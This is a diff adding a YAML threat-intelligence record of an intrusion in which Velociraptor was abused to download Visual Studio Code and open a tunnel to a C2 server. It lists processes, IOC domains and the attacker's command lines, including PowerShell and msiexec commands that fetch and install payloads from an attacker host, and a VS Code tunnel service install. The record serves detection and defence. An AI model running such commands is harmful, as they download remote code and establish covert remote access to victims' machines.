@@ -1,0 +1,51 @@
+description: CTU investigated an intrusion using Velociraptor to download and run
+  Visual Studio Code, creating a tunnel to a C2 server.
+attribution: Unknown threat actor (not specified)
+malware_families:
+- Velociraptor
+TTPs:
+  processes:
+  - wininit.exe
+  - services.exe
+  - Velociraptor.exe
+  - cnd.exe
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - C:\\Program Files\\Velociraptor\\Velociraptor.exe-config "C:\\Program Files\\Velociraptor/client.config.yaml"
+    service run
+  - cnd.exe /c"C:\\ProgramData\\code.exe tunnel --accept-server-license-terms serviceinstall
+    > c:\\users\\public\\i.log"
+  - cnd.exe /c "msiexec /q /ihttps://files.qaubctgg.workers.dev/sc.msi"
+  - cmd.exe /c "typec:\\users\\public\\i. log"
+  - powershell.exe -ExecutionPolicy Unrestricted -encodedCommand Invoke-WebRequest-Uri
+    https://files.qaubctgg.workers.dev/code.exe -OutFileC:\\ProgramData\\code.exe
+  powershell:
+  - -ExecutionPolicy Unrestricted -encodedCommand Invoke-WebRequest-Uri https://files.qaubctgg.workers.dev/code.exe
+    -OutFileC:\\ProgramData\\code.exe
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: Velociraptor.exe
+    destination: velo.qaubctgg.workers.dev
+  - process: powershell.exe
+    destination: files.qaubctgg.workers.dev
+  - process: cnd.exe
+    destination: files.qaubctgg.workers.dev
+  file_activity:
+  - C:\\ProgramData\\code.exe
+  - C:\\ProgramData\\sc.msi
+  - c:\\users\\public\\i.log
+  - C:\\Program Files\\Velociraptor\\client.config.yaml
+  persistence:
+  - Service installation of code.exe via cnd.exe command
+  - Velociraptor service run
+  process_relations: []
+IOCs:
+  domains:
+  - files.qaubctgg.workers.dev
+  - velo.qaubctgg.workers.dev
+reference: https://news.sophos.com/en-us/2025/08/26/velociraptor-incident-response-tool-abused-for-remote-access
+date_of_publication: August 26, 2025
+file_creation_date: October 01, 2025
